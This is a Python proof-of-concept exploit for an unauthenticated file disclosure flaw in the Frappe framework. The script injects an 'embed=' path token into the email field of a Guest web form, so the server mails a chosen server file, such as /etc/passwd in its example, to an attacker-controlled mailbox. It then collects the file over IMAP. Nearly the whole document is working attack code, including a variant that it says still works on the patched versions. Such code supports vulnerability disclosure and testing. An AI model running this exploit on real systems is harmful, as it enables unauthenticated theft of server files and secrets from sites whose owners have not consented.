#!/usr/bin/env python3
"""Frappe unauthenticated local file disclosure via email inline expansion (FRAPPE-01).

Frappe's Guest "request to delete data" Web Form emails a confirmation to the
address a Guest submits. The recipient field is expanded through a code path that
treats an `embed=<path>` token as an inline attachment, so a crafted recipient
makes Frappe read a server-side file and attach it to the outgoing mail. Point the
recipient at a mailbox you control and the file lands in your inbox.

This client submits the Guest form with the crafted recipient, then polls an
IMAP mailbox you control for the message and writes the recovered file to stdout
(or --output). No Frappe credentials are needed. Reviewed against Frappe
Framework 16.29.0.

Fix status: Frappe 15.117.0 and 16.30.0 block the absolute-path payload and are
the patched versions in Frappe's advisory GHSA-8v98-cfpm-9p67, but the email
helper still reads named private/files/ paths (unchanged through 16.51.0).

Set the IMAP password in FRAPPE_POC_IMAP_PASSWORD or enter it when prompted.
"""

from __future__ import annotations

import argparse
import getpass
import imaplib
import json
import os
import posixpath
import re
import ssl
import sys
import time
import urllib.error
import urllib.parse
import urllib.request
from email import policy
from email.parser import BytesParser
from email.utils import getaddresses
from pathlib import Path


RPC = "/api/method/frappe.website.doctype.web_form.web_form.accept"
FORM = "request-to-delete-data"
SUBJECT = "Confirm Deletion of Account"
IMAP_PASSWORD_ENV = "FRAPPE_POC_IMAP_PASSWORD"
EMAIL_RE = re.compile(
    r"[a-z0-9!#$%&'*+/=?^_\x60{|}~-]+(?:\.[a-z0-9!#$%&'*+/=?^_\x60{|}~-]+)*@"
    r"(?:[a-z0-9](?:[a-z0-9-]*[a-z0-9])?\.)+"
    r"[a-z0-9](?:[a-z0-9-]*[a-z0-9])?",
    re.I,
)


class PocError(RuntimeError):
    pass


# --- terminal UI ---
_BANNER = r"""
 _____ ____      _    ____  ____  _____
|  ___|  _ \    / \  |  _ \|  _ \| ____|
| |_  | |_) |  / _ \ | |_) | |_) |  _|
|  _| |  _ <  / ___ \|  __/|  __/| |___
|_|   |_| \_\/_/   \_\_|   |_|   |_____|
"""
_COLOR = sys.stderr.isatty() and os.environ.get("NO_COLOR") is None


def _paint(code: str, text: str) -> str:
    return f"\033[{code}m{text}\033[0m" if _COLOR else text


def disable_color() -> None:
    global _COLOR
    _COLOR = False


def banner(subtitle: str) -> None:
    sys.stderr.write(_paint("36", _BANNER.strip("\n")) + "\n")
    sys.stderr.write("  " + _paint("2", subtitle) + "\n")
    sys.stderr.write("  " + _paint("2", "discovered by CryptoCat · cryptocat.me") + "\n\n")


def info(msg: str) -> None:
    sys.stderr.write(f" {_paint('36', '[*]')} {msg}\n")


def good(msg: str) -> None:
    sys.stderr.write(f" {_paint('32', '[+]')} {msg}\n")


def warn(msg: str) -> None:
    sys.stderr.write(f" {_paint('33', '[!]')} {msg}\n")


def bad(msg: str) -> None:
    sys.stderr.write(f" {_paint('31', '[-]')} {msg}\n")


def rule() -> None:
    sys.stderr.write(_paint("2", "  " + "-" * 60) + "\n")
# --- end terminal UI ---


def tls_context(insecure: bool) -> ssl.SSLContext:
    context = ssl.create_default_context()
    if insecure:
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
    return context


def normalize_origin(value: str, label: str) -> str:
    value = value.strip().rstrip("/")
    try:
        parsed = urllib.parse.urlsplit(value)
        _ = parsed.port
    except ValueError as exc:
        raise PocError(f"invalid {label}: {exc}") from exc
    if parsed.scheme not in {"http", "https"} or not parsed.hostname:
        raise PocError(f"{label} must be an HTTP(S) origin")
    if (
        parsed.username
        or parsed.password
        or parsed.path not in {"", "/"}
        or parsed.query
        or parsed.fragment
    ):
        raise PocError(f"{label} must not contain userinfo, a path, query, or fragment")
    return value


def fetch(
    url: str,
    timeout: float,
    insecure: bool,
    *,
    data: bytes | None = None,
    headers: dict[str, str] | None = None,
) -> tuple[int, bytes]:
    opener = urllib.request.build_opener(
        urllib.request.HTTPSHandler(context=tls_context(insecure))
    )
    request = urllib.request.Request(url, data=data, headers=headers or {})
    try:
        with opener.open(request, timeout=timeout) as response:
            return int(response.status), response.read()
    except urllib.error.HTTPError as exc:
        return int(exc.code), exc.read()
    except (urllib.error.URLError, TimeoutError, OSError) as exc:
        raise PocError(f"request to {url} failed: {exc}") from exc


def embed_path(selected: str, mode: str) -> tuple[str, str]:
    if any(ord(char) < 0x20 or ord(char) == 0x7F for char in selected):
        raise PocError("--file must not contain control characters")
    if selected.endswith("/"):
        raise PocError("--file must identify a file")

    if mode == "absolute":
        if not selected.startswith("/") or selected.startswith("//"):
            raise PocError("absolute mode requires exactly one leading slash")
        if posixpath.normpath(selected) != selected:
            raise PocError("absolute mode rejects repeated separators and dot segments")
        return "/" + selected, posixpath.basename(selected)

    if not selected.startswith("private/files/") or selected.startswith("/"):
        raise PocError(
            "private-file mode requires private/files/NAME without a leading slash"
        )
    if posixpath.normpath(selected) != selected or selected == "private/files":
        raise PocError("private-file mode rejects dot segments and empty filenames")
    return selected, posixpath.basename(selected)


def exploit_recipient(
    embed: str,
    attacker_email: str | None,
    attacker_domain: str | None,
) -> tuple[str, str]:
    if attacker_domain:
        domain = attacker_domain.strip().lstrip("@").rstrip(".").lower()
        if "'" in embed:
            raise PocError("catch-all mode does not support a quote in --file")
        local = f"embed='{embed}'"
        try:
            if len(local.encode("ascii")) > 64:
                raise PocError("catch-all payload exceeds SMTP's 64-byte local-part limit")
        except UnicodeEncodeError as exc:
            raise PocError("catch-all mode requires an ASCII --file path") from exc
        envelope = f"{local}@{domain}"
        rendered = envelope
        if not EMAIL_RE.fullmatch(envelope):
            raise PocError("generated catch-all address is not accepted by Frappe")
    else:
        envelope = (attacker_email or "").strip()
        if not EMAIL_RE.fullmatch(envelope) or '"' in embed:
            raise PocError("invalid attacker email or unsupported quote in --file")
        rendered = f'{envelope} (embed="{embed}")'

    if len(rendered) > 140:
        raise PocError("payload exceeds the Web Form's 140-character email field")
    parsed = [address for _name, address in getaddresses([rendered]) if address]
    if parsed != [envelope]:
        raise PocError("generated recipient does not preserve the attacker mailbox")
    return rendered, envelope


def inspect_message(
    raw: bytes,
    recipient: str,
    filename: str,
) -> bytes | None:
    message = BytesParser(policy=policy.default).parsebytes(raw)
    recipients = [
        address.lower()
        for _name, address in getaddresses(message.get_all("To", []))
        if address
    ]
    subjects = message.get_all("Subject", [])
    if (
        len(subjects) != 1
        or str(subjects[0]) != SUBJECT
        or recipients != [recipient.lower()]
    ):
        return None

    matching_parts: list[bytes] = []
    for part in message.walk():
        if part.is_multipart():
            continue
        payload = part.get_payload(decode=True)
        if part.get_filename() == filename and isinstance(payload, bytes):
            matching_parts.append(payload)

    if len(matching_parts) != 1:
        raise PocError(
            f"matching mail contained {len(matching_parts)} MIME parts named {filename!r}"
        )
    return matching_parts[0]


class ImapMailbox:
    def __init__(self, args: argparse.Namespace, password: str) -> None:
        try:
            if args.imap_plain:
                self.connection = imaplib.IMAP4(
                    args.imap_host, args.imap_port or 143, timeout=args.timeout
                )
            else:
                self.connection = imaplib.IMAP4_SSL(
                    args.imap_host,
                    args.imap_port or 993,
                    ssl_context=tls_context(args.insecure),
                    timeout=args.timeout,
                )
            self.connection.login(args.imap_user, password)
            status, _data = self.connection.select(args.imap_mailbox, readonly=True)
            if status != "OK":
                raise PocError(f"could not select IMAP mailbox {args.imap_mailbox!r}")
        except (imaplib.IMAP4.error, OSError, ssl.SSLError) as exc:
            raise PocError(f"IMAP connection failed: {exc}") from exc

    def close(self) -> None:
        try:
            self.connection.logout()
        except (imaplib.IMAP4.error, OSError):
            pass

    def uids(self) -> set[bytes]:
        try:
            status, data = self.connection.uid("search", None, "SUBJECT", f'"{SUBJECT}"')
        except (imaplib.IMAP4.error, OSError) as exc:
            raise PocError(f"IMAP search failed: {exc}") from exc
        if status != "OK" or not data:
            raise PocError("IMAP search failed")
        return set((data[0] or b"").split())

    def poll(
        self,
        baseline: set[bytes],
        recipient: str,
        filename: str,
        seconds: float,
        interval: float,
    ) -> bytes:
        deadline = time.monotonic() + seconds
        rejected: set[bytes] = set()
        while time.monotonic() < deadline:
            for uid in sorted(self.uids() - baseline - rejected, key=int, reverse=True):
                try:
                    status, data = self.connection.uid("fetch", uid, "(BODY.PEEK[])")
                    if status != "OK":
                        raise PocError("IMAP fetch failed")
                    raw = next(
                        item[1]
                        for item in data or []
                        if isinstance(item, tuple) and isinstance(item[1], bytes)
                    )
                except (StopIteration, imaplib.IMAP4.error, OSError, PocError):
                    rejected.add(uid)
                    continue
                attachment = inspect_message(
                    raw,
                    recipient,
                    filename,
                )
                if attachment is not None:
                    return attachment
                rejected.add(uid)
            time.sleep(interval)
        raise PocError(f"no matching IMAP message arrived within {seconds:g} seconds")


def imap_password() -> str:
    if password := os.environ.get(IMAP_PASSWORD_ENV):
        return password
    if sys.stdin.isatty():
        return getpass.getpass("IMAP password: ")
    raise PocError(f"set {IMAP_PASSWORD_ENV} or run interactively")


def submit(args: argparse.Namespace, recipient: str) -> None:
    body = urllib.parse.urlencode(
        {
            "web_form": FORM,
            "data": json.dumps({"email": recipient}, separators=(",", ":")),
        }
    ).encode()
    status, raw = fetch(
        args.url + RPC,
        args.timeout,
        args.insecure,
        data=body,
        headers={
            "Accept": "application/json",
            "Accept-Language": "en",
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "cryptocat-frappe01-poc",
        },
    )
    if not 200 <= status < 300:
        detail = raw[:300].decode("utf-8", "replace")
        raise PocError(f"Guest submission returned HTTP {status}: {detail}")
    try:
        response = json.loads(raw)
    except (UnicodeDecodeError, json.JSONDecodeError):
        response = {}
    if isinstance(response, dict) and (response.get("exc") or response.get("exception")):
        raise PocError("Frappe returned an application exception")


def make_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        description=__doc__,
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="example:\n"
               "  FRAPPE_POC_IMAP_PASSWORD=pass %(prog)s --url https://frappe.example \\\n"
               "    --file /etc/passwd --attacker-domain attacker.example \\\n"
               "    --imap-host imap.attacker.example --imap-user drop@attacker.example\n",
    )
    parser.add_argument("--url", required=True, metavar="URL", help="Frappe site origin")
    parser.add_argument("--file", required=True, metavar="PATH", help="server-side file path to recover")
    parser.add_argument(
        "--path-mode",
        choices=("absolute", "private-file"),
        default="absolute",
        help="absolute uses FRAPPE-01; private-file uses the retained private/files path",
    )
    recipient = parser.add_mutually_exclusive_group(required=True)
    recipient.add_argument("--attacker-email", metavar="ADDR", help="controlled mailbox address to receive the file")
    recipient.add_argument("--attacker-domain", metavar="DOMAIN", help="controlled catch-all domain (payload in the local part)")
    parser.add_argument("--imap-host", required=True, metavar="HOST", help="controlled IMAP server to poll for the file")
    parser.add_argument("--imap-user", required=True, metavar="USER", help="IMAP username")
    parser.add_argument("--imap-port", type=int, metavar="PORT", help="IMAP port (default: 993, or 143 with --imap-plain)")
    parser.add_argument("--imap-mailbox", default="INBOX", metavar="NAME", help="IMAP mailbox to search (default: INBOX)")
    parser.add_argument("--imap-plain", action="store_true", help="use plaintext IMAP instead of IMAPS")
    parser.add_argument("--output", type=Path, metavar="PATH", help="save recovered bytes instead of stdout")
    parser.add_argument("--timeout", type=float, default=15.0, metavar="SECS", help="HTTP/IMAP timeout (default: 15)")
    parser.add_argument("--poll-seconds", type=float, default=120.0, metavar="SECS", help="how long to wait for the email (default: 120)")
    parser.add_argument("--poll-interval", type=float, default=2.0, metavar="SECS", help="IMAP poll interval (default: 2)")
    parser.add_argument("--insecure", action="store_true", help="disable TLS certificate verification")
    parser.add_argument("--no-color", action="store_true", help="disable coloured output")
    return parser


def run(args: argparse.Namespace) -> int:
    if args.no_color:
        disable_color()
    banner("unauthenticated local file disclosure  ·  FRAPPE-01")
    if min(args.timeout, args.poll_seconds, args.poll_interval) <= 0:
        raise PocError("timeouts must be greater than zero")
    if args.output and (args.output.exists() or args.output.is_symlink()):
        raise PocError(f"refusing to overwrite {args.output}")

    args.url = normalize_origin(args.url, "target URL")
    embed, filename = embed_path(args.file, args.path_mode)
    rendered, envelope = exploit_recipient(
        embed, args.attacker_email, args.attacker_domain
    )

    mailbox = ImapMailbox(args, imap_password())
    baseline = mailbox.uids()

    try:
        info(f"requesting {args.file} through recipient {envelope}")
        submit(args, rendered)
        good("Guest submission accepted; waiting for the matching email")
        attachment = mailbox.poll(
            baseline,
            envelope,
            filename,
            args.poll_seconds,
            args.poll_interval,
        )
    finally:
        mailbox.close()

    if args.output:
        try:
            with args.output.open("xb") as output:
                output.write(attachment)
        except OSError as exc:
            raise PocError(f"could not write {args.output}: {exc}") from exc
        good(f"recovered {len(attachment)} bytes; wrote them to {args.output}")
    else:
        good(f"recovered {len(attachment)} bytes")
        rule()
        sys.stdout.buffer.write(attachment)
        sys.stdout.buffer.flush()
    return 0


def main() -> int:
    try:
        return run(make_parser().parse_args())
    except PocError as exc:
        bad(str(exc))
        return 1
    except KeyboardInterrupt:
        bad("interrupted")
        return 130


if __name__ == "__main__":
    raise SystemExit(main())
